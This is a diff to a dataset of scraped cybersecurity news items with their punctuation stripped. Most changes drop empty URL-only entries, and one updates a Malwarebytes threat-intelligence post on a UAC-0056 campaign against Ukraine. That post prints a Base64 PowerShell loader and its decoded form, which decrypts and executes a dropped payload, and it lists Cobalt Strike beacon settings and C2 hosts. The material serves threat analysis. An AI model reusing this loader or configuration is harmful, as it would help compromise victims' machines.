@@ -91,11 +91,6 @@
     },
     {
         "time": "2022-07-27",
-        "title": "httpsbuildprestashop-projectorgnews2022prestashop-1-7-8-7-maintenance-release",
-        "text": ""
-    },
-    {
-        "time": "2022-07-27",
         "title": "Hackers steal 6 million from blockchain music platform Audius",
         "text": "The decentralized music platform Audius was hacked over the weekend with threat actors stealing over 18 million AUDIO tokens worth approximately 6 millionAudius is a decentralized streaming platform hosted on the Ethereum blockchain where artists can earn AUDIO tokens by sharing their music and users can earn tokens by curating and listening to contentAfter a hacker stole 6 million worth of AUDIO tokens this weekend the platform responded within minutes by freezing several services until the developers could deploy fixes to prevent further theft of tokensAccording to a post-mortem report published by Audius on Sunday the hacker exploited a bug in the contract initialization code that allowed them to perform repeated invocations of the initialize functionsThis enabled the intruder to transfer 185 million AUDIO tokens held by the so-called community treasury to their wallet essentially stealing a significant amount of money and changing the platform's governance dynamicsNext the actor attempted to execute four governance proposals three of which failed and one passed transferring the entirety of the Audius community pool to the attacker's walletAs Audius concluded in the post-mortem report no new tokens were minted and the incident had no impact on the circulation of token supply All remaining user funds are now safe according to the platformBy late Sunday the AUDIO token was fully functional again but the Staking and Delegate Manager smart contract systems have not resumed operation as the fixes are still being evaluatedIn the meantime the attacker traded their tokens on Uniswap for only 107 million losing 56 of their value and then passed them through the Tornado Cash mixing service to hide the trail of the stolen fundsThese contracts were deployed in October 2020 and this vulnerability has been live in the wild since that timeThis is a teaching moment for Audius and other blockchain-based projects showing that the required audits do not always find all exploitable bugsAnother point that Audius promised to improve in the future was its incident response for which several points for improvement were identifiedIn this case Audius was lucky that the cyberattack unfolded when most of its team members were awake and could respond quickly to prevent further theft"
     },
@@ -208,11 +203,6 @@
         "time": "2022-07-25",
         "title": "Chrome Flaw Exploited by Israeli Spyware Firm Also Impacts Edge Safari - SecurityWeek",
         "text": "Hi what are you looking forA recently patched Chrome vulnerability that appears to have been exploited by an Israeli spyware company also impacts Microsofts Edge and Apples Safari web browsersByFlipboardRedditWhatsappWhatsappEmailEduard Kovacs EduardKovacs is a managing editor at SecurityWeek He worked as a high school IT teacher for two years before starting a career in journalism as Softpedias security news reporter Eduard holds a bachelors degree in industrial informatics and a masters degree in computer techniques applied in electrical engineeringSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats trends and technology along with insightful columns from industry expertsJoin us as we delve into the transformative potential of AI predictive ChatGPT-like tools and automation to detect and defend against cyberattacksAs cybersecurity breaches and incidents escalate the cyber insurance ecosystem is undergoing rapid and transformational change FlipboardRedditWhatsappWhatsappEmailThe changing nature of what we still generally call ransomware will continue through 2023 driven by three primary conditionsLess than a week after announcing that it would suspended service indefinitely due to a conflict with an at the time unnamed security researcherA recently disclosed vBulletin vulnerability which had a zero-day status for roughly two days last week was exploited in a hacker attack targeting theOpenAI has confirmed a ChatGPT data breach on the same day a security firm reported seeing the use of a component affected by anWASHINGTON - Cyberattacks are the most serious threat facing the United States even more so than terrorism according to American defense experts Almost halfThe supply chain threat is directly linked to attack surface management but the supply chain must be known and understood before it can beA group of seven security researchers have discovered numerous vulnerabilities in vehicles from 16 car makers including bugs that allowed them to control carA researcher at IOActive discovered that home security systems from SimpliSafe are plagued by a vulnerability that allows tech savvy burglars to remotely disableGot a confidential news tip We want to hear from youReach a large audience of enterprise cybersecurity professionals Subscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inboxCopyright 2023 SecurityWeek a Wired Business Media Publication All Rights Reserved"
-    },
-    {
-        "time": "2022-07-25",
-        "title": "httpsmediumcomdfrlabhow-russia-promoted-the-claim-that-ukraine-re-sold-french-howitzers-for-profit-fd51f71a9362",
-        "text": ""
     },
     {
         "time": "2022-07-22",
@@ -452,7 +442,7 @@
     {
         "time": "2022-07-15",
         "title": "Cobalt Strikes again UAC-0056 continues to target Ukraine in its latest campaign",
-        "text": "PersonalFind the right productInfected already Business PricingProtect your personal devices and dataProtect your teams devices and dataExplore our award-winning endpoint security products from EP to EDR to MDR Partners Resources SupportThis blog was authored by Roberto Santos and Hossein JaziThe Malwarebytes Threat Intelligence team recently reviewed a series of cyber attacks against Ukraine that we attribute with high confidence to UAC-0056 AKAUNC2589 TA471 This threat group has repeatedly targeted the government entities in Ukraine via phishing campaigns following the same common tactics techniques and procedures TTPsLures are based on important matters related to the ongoing war and humanitarian disaster happening in Ukraine We have been closely monitoring this threat actor and noticed changes in their macro-based documents as well as their final payloadsIn this blog we will connect the dots between different decoy samples that we and others such as Ukraine CERT have observed We will also share indicators for a previously undocumented campaign performed by the same threat actor at the end of JuneThe Help Ukraine lure to our knowledge has never been publicly documented beforeAlso in the past we have found comments regarding to a domain named ExcelVBAru This document was contacting a suspiciously similar domain named excel-vbaruAmong victims we find govua emails being targeted One of the texts used as email body in the last campaign was written in Ukrainian and translates toOn February 24 2022 the army of the terrorist state the Russian Federation intervened on the territory of Ukraine In order to counter the propaganda of the Russian government the State Department of Statistics at the Office of the President of Ukraine prepared a consolidated report on the dead citizens of Ukraine on the citizens of Ukraine who were left without a home on the citizens of Ukraine who lost their jobs on the number of destroyed homes on the number of destroyed businesses as a result of an act of aggression This report shows all the data broken down by regions of Ukraine Familiarize yourself and familiarize your colleagues with the real state of affairs Glory to UkraineThe document will download an executable file named writebin Other attacks following the same scheme used different names for this file including Officeexe baseupdexe and DataSourceexe The file is slightly obfuscated and performs the following actionsAfter some antidebug tricks the registry key HKCUSoftwareMicrosoftWindowsCurrentVersionRunCheck License is used to establish persistence Next step is dropping a file in CProgramDataTRYxaEbX This file will be used laterThe payload will execute the following powershell Base64 encoded commandJABBADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFQAUgBZAHgAYQBFAGIAWAAiACkAOwAKACQAQgAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAQwBtAEEASgBuAGcAdgBkAEQAbQBpAFQAagBMAHgATgAiACkAOwAKACQAQQA9AHsAJABXACwAJABZAD0AJABBAHIAZwBzADsAJABYAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAFoAPQAoACQAWgArACQAWABbACQAXwBdACsAJABZAFsAJABfACUAJABZAC4ATABlAG4AZwB0AGgAXQApACUAMgA1ADYAOwAkAFgAWwAkAF8AXQAsACQAWABbACQAWgBdAD0AJABYAFsAJABaAF0ALAAkAFgAWwAkAF8AXQB9ADsAJABXAHwAJQB7ACQAVQA9ACgAJABVACsAMQApACUAMgA1ADYAOwAkAFYAPQAoACQAVgArACQAWABbACQAVQBdACkAJQAyADUANgA7ACQAWABbACQAVQBdACwAJABYAFsAJABWAF0APQAkAFgAWwAkAFYAXQAsACQAWABbACQAVQBdADsAJABfAC0AYgB4AG8AcgAkAFgAWwAoACQAWABbACQAVQBdACsAJABYAFsAJABWAF0AKQAlADIANQA2AF0AfQB9ADsACgAkAEMAIAA9ACAAKAAmACAAJABBACAAJABBADEAIAAkAEIAMQApADsACgAkAEUAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAEMALAAwACwAJABDAC4ATABlAG4AZwB0AGgAKQA7AAoAJABFACAAPQAgACQARQAgAC0AUwBwAGwAaQB0ACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoATgBlAHcATABpAG4AZQA7AAoAZgBvAHIAZQBhAGMAaAAoACQARQBFACAAaQBuACAAJABFACkAewBpAGUAeAAgACQAKAAkAEUARQArACIAOwAiACkAOwB9ADsAThe chunk before is Base64 encoded which decodes toA1 SystemIOFileReadAllBytesCProgramDataTRYxaEbXAWYArgsX02550255ZZXYYLength256XXZXZXWUU1256VVXU256XUXVXVXU-bxorXXUXV256C A A1 B1E New-Object -TypeName SystemTextUTF8EncodingGetStringC0CLengthE E -Split EnvironmentNewLineforeachEE in Eiex EEIn short the file dropped inCProgramDataTRYxaEbX will be decrypted usingHere we can see some of the actions that will be takenAfter this step another Base64 payload is decoded and executedAs it can be seen the main functionality provided by this second PowerShell file is to inject shellcode This shellcode can be 32 or 64 bit and is a Cobalt Strike beacon with the following configurationBeaconType HTTPSPort 443SleepTime 30000PublicKeyMD5 defb5d95ce99e1ebbf421a1a38d9cb64C2Server skreatortempsites08u1XdxChhMrLYdTasfnOMQpbsLkpq3ofield-keywordsUserAgent Mozilla50Frsgstredfo21rutyyyruitype Windows NT 100 Win64 x64 Trident70 D-M1-200309ACD-M1-MSSP1 rv110 like Gecko10984gapHttpPostUri nBz07hg5l3C9wuWVCGV-5xHHu1amjf76F2A8iavpamznussrapsWatermark 1580103824By having a Cobalt Strike instance running on the victims machine it is now fully compromisedAt the time of writing malicious CC servers seem to be down However on July 5 we saw active servers and successful connections to our test environment The attackers actively sent reconnaissance commands to the machine listing the content of several foldersWe consider these actions preliminary moves to check whether the machine is a viable target or not before following up with other actionsBased on recent attacks reported by CERT UA as well as the similarities indicated at the beginning of the blog we can attribute this attack with high confidence to UAC-0056Signatures contained in the Cobalt Strike beacons watermark 1580103824 and public key However it is important to note that in that case we cannot simply rely on a public key to attribute the sample we analyzed in this report In fact these signatures have been attributed to many different groups Our assessment is that the group used a leaked version of Cobalt Strike and used the same private key as others making attribution harderMalwarebytes users were protected against this campaign thanks to our Anti-Exploit layerMalicious Excel documents Help Ukraine templatefe3bc87b433e51e0713d80e379a61916ceb6007648b0fde1c44491ba44dc1cb3c9675483ab362bc656a9f682928b6a0c3ff60a274ade3ceabac332069480605a1b95186ecc081911c3a80f278e4ed34ee9ef3a46f5cf1ae8573ac3a4c69df532258a9665af7120d0d80766c119e48a4035ee3b68676076bf3ed6462c644fe7d0e663bb4d9506e7c09bcf7b764d31b61d8f7dbae0b64dd4ef4e9d282e1909d386ecd2bb648a9ad28069c1ec4c0da546507797fdf0243e9e5eece581bf702675ffeac9a4d9b63a0ca68194eae433d6b2e9a4531b60b82faf218b8dd4b69cec09dfMalicious Excel documents Humanitarian template024054ff04e0fd75a4765dd705067a6b336caa751f0a804fefce787382ac45c114736be09a7652d206cd6ab35375116ec4fad499bb1b47567e4fd56dcfcd22ea474a0f0bb5b17a1bb024e08a0bb46277ba03392ee95766870c981658c4c2300dPayloads0709a8f18c8436deea0b57deab55afbcea17657cb0186cbf0f6fcbb551661470aadd8c7c248915c5da49c976f24aeb98ccc426fb31d1d6913519694a7bb9351afb2a9dcfcf41c493fb7348ff867bb3cad9962a04c9dfd5b1afa115f7ff737346501d4741a0aa8784e9feeb9f960f259c09cbceccb206f355209c851b7f094effCobalt Strike beacon and payloads13614441177syriahreusXnk75JwUcIebkrmENtufIiiKEmoqBNfield-keywordssyriahreunzXlLVas-VALvDh9lopkCavpamznussrapsskreatortempsiteimolaoggieuSHARE THIS ARTICLENovember 22 2023 - Here are the innovations weve made in our products recently Are you making the most of themNovember 22 2023 - Google's recently been accused of privacy washing despite claiming its a privacy-focused company But what is privacy washingNovember 21 2023 - Nothing's new message app Chats has been pulled from Google Play after harsh criticism about security issuesNovember 21 2023 - Browser push notifications are becoming a problem on macOS Learn how to remove themNovember 21 2023 - The Australian Cyber Security Centre has provided 10 steps for small and medium businesses to store customers' personal data securelyABOUT THE AUTHORCyberprotection for every oneCOMPANYMY ACCOUNTADDRESSOne Albert Quay2nd FloorCork T12 X8N6Ireland3979 Freedom Circle12th FloorSanta Clara CA 95054Want to stay informed on the latest news in cybersecurity Sign up for our newsletter and learn how to protect your computer from threats 2023 All Rights ReservedSelect your language"
+        "text": "PersonalFind the right productInfected already Business PricingProtect your personal devices and dataProtect your teams devices and dataExplore our award-winning endpoint security products from EP to EDR to MDR Partners Resources SupportThis blog was authored by Roberto Santos and Hossein JaziThe Malwarebytes Threat Intelligence team recently reviewed a series of cyber attacks against Ukraine that we attribute with high confidence to UAC-0056 AKAUNC2589 TA471 This threat group has repeatedly targeted the government entities in Ukraine via phishing campaigns following the same common tactics techniques and procedures TTPsLures are based on important matters related to the ongoing war and humanitarian disaster happening in Ukraine We have been closely monitoring this threat actor and noticed changes in their macro-based documents as well as their final payloadsIn this blog we will connect the dots between different decoy samples that we and others such as Ukraine CERT have observed We will also share indicators for a previously undocumented campaign performed by the same threat actor at the end of JuneThe Help Ukraine lure to our knowledge has never been publicly documented beforeAlso in the past we have found comments regarding to a domain named ExcelVBAru This document was contacting a suspiciously similar domain named excel-vbaruAmong victims we find govua emails being targeted One of the texts used as email body in the last campaign was written in Ukrainian and translates toOn February 24 2022 the army of the terrorist state the Russian Federation intervened on the territory of Ukraine In order to counter the propaganda of the Russian government the State Department of Statistics at the Office of the President of Ukraine prepared a consolidated report on the dead citizens of Ukraine on the citizens of Ukraine who were left without a home on the citizens of Ukraine who lost their jobs on the number of destroyed homes on the number of destroyed businesses as a result of an act of aggression This report shows all the data broken down by regions of Ukraine Familiarize yourself and familiarize your colleagues with the real state of affairs Glory to UkraineThe document will download an executable file named writebin Other attacks following the same scheme used different names for this file including Officeexe baseupdexe and DataSourceexe The file is slightly obfuscated and performs the following actionsAfter some antidebug tricks the registry key HKCUSoftwareMicrosoftWindowsCurrentVersionRunCheck License is used to establish persistence Next step is dropping a file in CProgramDataTRYxaEbX This file will be used laterThe payload will execute the following powershell Base64 encoded commandJABBADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFQAUgBZAHgAYQBFAGIAWAAiACkAOwAKACQAQgAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAQwBtAEEASgBuAGcAdgBkAEQAbQBpAFQAagBMAHgATgAiACkAOwAKACQAQQA9AHsAJABXACwAJABZAD0AJABBAHIAZwBzADsAJABYAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAFoAPQAoACQAWgArACQAWABbACQAXwBdACsAJABZAFsAJABfACUAJABZAC4ATABlAG4AZwB0AGgAXQApACUAMgA1ADYAOwAkAFgAWwAkAF8AXQAsACQAWABbACQAWgBdAD0AJABYAFsAJABaAF0ALAAkAFgAWwAkAF8AXQB9ADsAJABXAHwAJQB7ACQAVQA9ACgAJABVACsAMQApACUAMgA1ADYAOwAkAFYAPQAoACQAVgArACQAWABbACQAVQBdACkAJQAyADUANgA7ACQAWABbACQAVQBdACwAJABYAFsAJABWAF0APQAkAFgAWwAkAFYAXQAsACQAWABbACQAVQBdADsAJABfAC0AYgB4AG8AcgAkAFgAWwAoACQAWABbACQAVQBdACsAJABYAFsAJABWAF0AKQAlADIANQA2AF0AfQB9ADsACgAkAEMAIAA9ACAAKAAmACAAJABBACAAJABBADEAIAAkAEIAMQApADsACgAkAEUAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAEMALAAwACwAJABDAC4ATABlAG4AZwB0AGgAKQA7AAoAJABFACAAPQAgACQARQAgAC0AUwBwAGwAaQB0ACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoATgBlAHcATABpAG4AZQA7AAoAZgBvAHIAZQBhAGMAaAAoACQARQBFACAAaQBuACAAJABFACkAewBpAGUAeAAgACQAKAAkAEUARQArACIAOwAiACkAOwB9ADsAThe chunk before is Base64 encoded which decodes toA1 SystemIOFileReadAllBytesCProgramDataTRYxaEbXAWYArgsX02550255ZZXYYLength256XXZXZXWUU1256VVXU256XUXVXVXU-bxorXXUXV256C A A1 B1E New-Object -TypeName SystemTextUTF8EncodingGetStringC0CLengthE E -Split EnvironmentNewLineforeachEE in Eiex EEIn short the file dropped inCProgramDataTRYxaEbX will be decrypted usingHere we can see some of the actions that will be takenAfter this step another Base64 payload is decoded and executedAs it can be seen the main functionality provided by this second PowerShell file is to inject shellcode This shellcode can be 32 or 64 bit and is a Cobalt Strike beacon with the following configurationBeaconType HTTPSPort 443SleepTime 30000PublicKeyMD5 defb5d95ce99e1ebbf421a1a38d9cb64C2Server skreatortempsites08u1XdxChhMrLYdTasfnOMQpbsLkpq3ofield-keywordsUserAgent Mozilla50Frsgstredfo21rutyyyruitype Windows NT 100 Win64 x64 Trident70 D-M1-200309ACD-M1-MSSP1 rv110 like Gecko10984gapHttpPostUri nBz07hg5l3C9wuWVCGV-5xHHu1amjf76F2A8iavpamznussrapsWatermark 1580103824By having a Cobalt Strike instance running on the victims machine it is now fully compromisedAt the time of writing malicious CC servers seem to be down However on July 5 we saw active servers and successful connections to our test environment The attackers actively sent reconnaissance commands to the machine listing the content of several foldersWe consider these actions preliminary moves to check whether the machine is a viable target or not before following up with other actionsBased on recent attacks reported by CERT UA as well as the similarities indicated at the beginning of the blog we can attribute this attack with high confidence to UAC-0056Signatures contained in the Cobalt Strike beacons watermark 1580103824 and public key However it is important to note that in that case we cannot simply rely on a public key to attribute the sample we analyzed in this report In fact these signatures have been attributed to many different groups Our assessment is that the group used a leaked version of Cobalt Strike and used the same private key as others making attribution harderMalwarebytes users were protected against this campaign thanks to our Anti-Exploit layerMalicious Excel documents Help Ukraine templatefe3bc87b433e51e0713d80e379a61916ceb6007648b0fde1c44491ba44dc1cb3c9675483ab362bc656a9f682928b6a0c3ff60a274ade3ceabac332069480605a1b95186ecc081911c3a80f278e4ed34ee9ef3a46f5cf1ae8573ac3a4c69df532258a9665af7120d0d80766c119e48a4035ee3b68676076bf3ed6462c644fe7d0e663bb4d9506e7c09bcf7b764d31b61d8f7dbae0b64dd4ef4e9d282e1909d386ecd2bb648a9ad28069c1ec4c0da546507797fdf0243e9e5eece581bf702675ffeac9a4d9b63a0ca68194eae433d6b2e9a4531b60b82faf218b8dd4b69cec09dfMalicious Excel documents Humanitarian template024054ff04e0fd75a4765dd705067a6b336caa751f0a804fefce787382ac45c114736be09a7652d206cd6ab35375116ec4fad499bb1b47567e4fd56dcfcd22ea474a0f0bb5b17a1bb024e08a0bb46277ba03392ee95766870c981658c4c2300dPayloads0709a8f18c8436deea0b57deab55afbcea17657cb0186cbf0f6fcbb551661470aadd8c7c248915c5da49c976f24aeb98ccc426fb31d1d6913519694a7bb9351afb2a9dcfcf41c493fb7348ff867bb3cad9962a04c9dfd5b1afa115f7ff737346501d4741a0aa8784e9feeb9f960f259c09cbceccb206f355209c851b7f094effCobalt Strike beacon and payloads13614441177syriahreusXnk75JwUcIebkrmENtufIiiKEmoqBNfield-keywordssyriahreunzXlLVas-VALvDh9lopkCavpamznussrapsskreatortempsiteimolaoggieuSHARE THIS ARTICLENovember 23 2023 - Google has set a date for the introduction of Manifest V3 which will hurt the capabilities of many ad blockersNovember 23 2023 - What better way to kick off the holiday scamming season than by offering a Black Friday sale on one of the most popular products around a Stanley cupNovember 22 2023 - Here are the innovations weve made in our products recently Are you making the most of themNovember 22 2023 - Google's recently been accused of privacy washing despite claiming its a privacy-focused company But what is privacy washingNovember 21 2023 - Nothing's new message app Chats has been pulled from Google Play after harsh criticism about security issuesABOUT THE AUTHORCyberprotection for every oneCOMPANYMY ACCOUNTADDRESSOne Albert Quay2nd FloorCork T12 X8N6Ireland3979 Freedom Circle12th FloorSanta Clara CA 95054Want to stay informed on the latest news in cybersecurity Sign up for our newsletter and learn how to protect your computer from threats 2023 All Rights ReservedSelect your language"
     },
     {
         "time": "2022-07-15",
@@ -478,21 +468,6 @@
         "time": "2022-07-15",
         "title": "19 Million Healthcare Records Breached in Ransomware Attack - Infosecurity Magazine",
         "text": "Contributing Writer North America Webinar ModeratorUS debt collector Professional Finance Company PFC has reported a data breach affecting 19 million individuals across over 650 different healthcare providersThe Colorado-based company which chases outstanding debts for healthcare companies said that an unauthorized intruder accessed personal data including names addresses amount owing and information regarding payments made to accounts Some individuals also had their social security number date of birth and health insurance and medical treatment information exposed it warnedThe company noticed the ransomware attack on February 26 It bought in forensics experts and informed law enforcement but did not inform healthcare providers until early MayPFC is contacting individuals potentially affected by the breach and will offer them free credit monitoringThe Department is currently investigating the incident which would be the second largest under investigation this year The first was a breach of two million records reported in May by Shields Health Care Group That attack potentially affected 2 million records according to the DHHS"
-    },
-    {
-        "time": "2022-07-15",
-        "title": "httpswwwbleepingcomputercomnewssecuritypaypal-phishing-kit-added-to-hacked-wordpress-sites-for-full-id-theft",
-        "text": ""
-    },
-    {
-        "time": "2022-07-15",
-        "title": "httpswwwmicrosoftcomsecurityblog20220714north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware",
-        "text": ""
-    },
-    {
-        "time": "2022-07-15",
-        "title": "httpstherecordmediafirst-cyber-safety-review-board-report-finds-log4j-has-become-an-endemic-vulnerability",
-        "text": ""
     },
     {
         "time": "2022-07-15",
@@ -531,11 +506,6 @@
     },
     {
         "time": "2022-07-14",
-        "title": "httpswwwbleepingcomputercomnewssecurity8-million-stolen-in-large-scale-uniswap-airdrop-phishing-attack",
-        "text": ""
-    },
-    {
-        "time": "2022-07-14",
         "title": "US FTC Vows to Crack Down on illegal Use and Sharing of Citizens' Sensitive Data",
         "text": "The US Federal Trade Commission FTC warned this week that it will crack down on tech companies' illegal use and sharing of highly sensitive data and false claims about data anonymizationThese companies often build profiles about consumers and draw inferences about them based on the places they have visited the FTC said adding the abuse of mobile location and health information exposes users to significant harmTo that end the consumer protection authority said it intends to vigorously enforce the law should it uncover cases where location health or other sensitive data are exploited for profit or other ulterior motivesDiscover how application detection response and automated behavior modeling can revolutionize your defense against insider threatsJoin the conversation to learn how to combat Zenbleed and Kubernetes attacksSign up for free and start receiving your daily dose of cybersecurity news insights and tips"
     },
@@ -545,23 +515,8 @@
         "text": "News WriterA new ransomware family dubbed HavanaCrypt disguises itself as a Google software update app using a Microsoft web hosting service IP address as its command and control server to circumvent detectionThe HavanaCrypt ransomware family detailed by Trend Micro is similar in its aims It disguises itself as a Google software update application and uses a Microsoft web hosting service IP address as its command and control server to circumvent detection Trend Micro said in a blogHavanaCrypt avoids encrypting files in several directories including Tor Taking this into account it is highly possible that the ransomwares author is planning to communicate via the Tor browser Trend Micro researchers saidIn addition the researchers pointed out that HavanaCrypt does not drop a ransom note This might be an indication that HavanaCrypt is still in its development phase they said Nevertheless it is important to detect and block it before it evolves further and does even more damageRansomware groups are turning up pressure on their victims said Bharat Mistry technical director at Trend Micro The level of sophistication used by criminal gangs is exponentially increasing and simply relying on user awareness training and endpoint defenses is no longer enough"
     },
     {
-        "time": "2022-07-14",
-        "title": "httpswwwinfosecurity-magazinecomnewsukraine-cyber-agency-cyber-attackutmsourcetwitterfeedutmmediumtwitter",
-        "text": ""
-    },
-    {
         "time": "2022-07-13",
         "title": "CERT-UA",
-        "text": ""
-    },
-    {
-        "time": "2022-07-13",
-        "title": "httpskrebsonsecuritycom202207microsoft-patch-tuesday-july-2022-editionutmsourcedlvritutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-13",
-        "title": "httpswwwbleepingcomputercomnewssecuritycisa-orders-agencies-to-patch-new-windows-zero-day-used-in-attacks",
         "text": ""
     },
     {
@@ -611,18 +566,8 @@
     },
     {
         "time": "2022-07-12",
-        "title": "httpstechcommunitymicrosoftcomt5windows-it-pro-blogwindows-autopatch-has-arrivedba-p3570119",
-        "text": ""
-    },
-    {
-        "time": "2022-07-12",
         "title": "Massive Rogers outage caused by a maintenance update",
         "text": "Over the weekend Rogers Communications CEO Tony Staffieri revealed the telecom company believes a maintenance update was what caused last week's massive outageWe disconnected the specific equipment and redirected traffic which allowed our network and services to come back online over time as we managed traffic volumes returning to normal levelsRogers has confirmed that its networks and systems are almost fully operational and connectivity has been restored for the vast majority of its customersServices have been restored for most customers and we're working hard to restore the rest as quickly as possible a banner alert currently displayed on Rogers' official website readsWe sincerely apologize for the disruption and thank you for your patience We will be automatically crediting all customersTo make things even worse for those affected by the outage Rogers has also warned customers to look out for scam text messages offering free credits to affected usersWe will apply the credit proactively to your account no action is required If you receive a suspicious SMS please forward it to 7726 SPAMWhile Rogers did not provide details on what the threat actors behind these malicious text messages are hoping to achieve these are most likely phishing messages attempting to redirect Rogers' customers to phishing sitesWhen opening links received via SMS phishing messages the potential victims are sent to attacker-controlled websites where they're asked to enter credentials personal information or financial info to redeem the free creditsAnother possible outcome is that the targets are asked to install a malicious application that will infect their devices with malware"
-    },
-    {
-        "time": "2022-07-12",
-        "title": "httpswwwcyberscoopcomwhite-house-backed-fund-deep-tech",
-        "text": ""
     },
     {
         "time": "2022-07-12",
@@ -645,21 +590,6 @@
         "text": "your nameYour Emailyour message"
     },
     {
-        "time": "2022-07-12",
-        "title": "httpswwwinfosecurity-magazinecomnewsonline-payment-fraud-five-yearsutmsourcetwitterfeedutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-12",
-        "title": "httpswwwinfosecurity-magazinecomnewsransomware-french-telecomesutmsourcetwitterfeedutmmediumtwitter",
-        "text": ""
-    },
-    {
-        "time": "2022-07-12",
-        "title": "httpsriskybiznewssubstackcomprisky-biz-news-thousands-of-yubikeys",
-        "text": ""
-    },
-    {
         "time": "2022-07-11",
         "title": "Rolling PWN",
         "text": "Modern vehicles are often equipped with a remote keyless entry system These RKE systems allow unlocking or starting the vehicle remotely The goal of our research was to evaluate the resistance of a modern-day RKE system Our research disclosed a Rolling-PWN attack vulnerability affecting all Honda vehicles currently existing on the market From the Year 2012 up to the Year 2022 This weakness allows anyone to permanently open the car door or even start the car engine from a long distance The Rolling-PWN bug is a serious vulnerability We found it in a vulnerable version of the rolling codes mechanism which is implemented in huge amounts of Honda vehicles A rolling code system in keyless entry systems is to prevent replay attack After each keyfob button pressed the rolling codes synchronizing counter is increased However the vehicle receiver will accept a sliding window of codes to avoid accidental key pressed by design By sending the commands in a consecutive sequence to the Honda vehicles it will be resynchronizing the counter Once counter resynced commands from the previous cycle of the counter worked again Therefore those commands can be used later to unlock the car at will 0 Please show me Rolling-PWN in action 1 Why it is called the Rolling-PWN not a Honda-PWNBecause this bug may exist in other brands of vehicles too 2 Who found the Rolling-PWN BugA team of security Researchers Kevin2600 and Wesley Li from Star-V Lab independently discovered this bug 3 Am I affected by the bugAs long as the vulnerable version of Honda vehicles is in use it can be abused 4 Is there an assigned CVE for Rolling-PWN CVE-2021-46145 is the official reference to this bug CVE is the Standard for Information Security Vulnerability Names maintained by MITRE 5 Can I detect if someone has exploited this against me Probably not The exploitation does not leave any traces in traditional log files But considering the ease of exploitation and attacks leaving no trace this threat should take seriously 6 Is this a Honda vehicle only Bug No Although the main targets for the research is Honda Automobiles But we have leads to show the impact of this vulnerability also applies to other car manufacturers We will release more details in the future 7 Is the risk real We have successfully tested the latest models of Honda vehicles And we strongly believe the vulnerability affects all Honda vehicles currently existing on the market Please see the field test video down below 8 What makes this Bug unique or what's the Difference between CVE-2022-27254 and CVE-2019-20626 9 Is there more technical information about Rolling-PWN You can follow the author on Twitter kevin2600 However we will not be releasing any tools required to go out and steal the affected vehicles At a later stage we will release technical information in order to encourage more researchers to get involved in the car security research 10 How to patch the modern automobile for Rolling-PWN bug like this The common solution requires us to bring the vehicle back to a local dealership as a recall But the recommended mitigation strategy is to upgrade the vulnerable BCM firmware through Over-the-Air OTA Updates if feasible However some old vehicles may not support OTA 11 What does Honda think about this Rolling-PWN Bug We have searched through the Honda official website but we can not find any contact info for report Vulnerability Seems Honda motor DOES NOT have a department to deal with security related issue for their productsAnd a person who works at HONDA has told us The best way to report the Honda vulnerability is to contact customer service Therefore we filed a report to Honda Customer service Honda spokesperson first denied the bug's existence The keyfobs in the referenced vehicles are equipped with rolling code technology that would not allow the vulnerability as represented in the report However in the end Honda concluded this is a low risk to the customers and Honda regularly improves security features as new models are introduced that would thwart this and similar approaches So lets fingers crossed Rolling Pwn"
@@ -668,11 +598,6 @@
         "time": "2022-07-11",
         "title": "Hackers Used Fake LinkedIn Job Offer to Steal 625M - CySecurity News - Latest Information Security and Hacking Incidents",
         "text": "your nameYour Emailyour message"
-    },
-    {
-        "time": "2022-07-11",
-        "title": "httpswwwcysecuritynews202207callback-malware-campaign-imitateshtmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
     },
     {
         "time": "2022-07-11",
@@ -698,11 +623,6 @@
         "time": "2022-07-11",
         "title": "Hackers Target National Portal of India Via Unprecedented Phishing Method - CySecurity News - Latest Information Security and Hacking Incidents",
         "text": "your nameYour Emailyour message"
-    },
-    {
-        "time": "2022-07-11",
-        "title": "httpswwwcysecuritynews202207abcsoup-adware-campaign-employs-350htmlutmsourcedlvritutmmediumtwitter",
-        "text": ""
     },
     {
         "time": "2022-07-11",
@@ -748,11 +668,6 @@
         "time": "2022-07-08",
         "title": "Online programming IDEs can be used to launch remote cyberattacks",
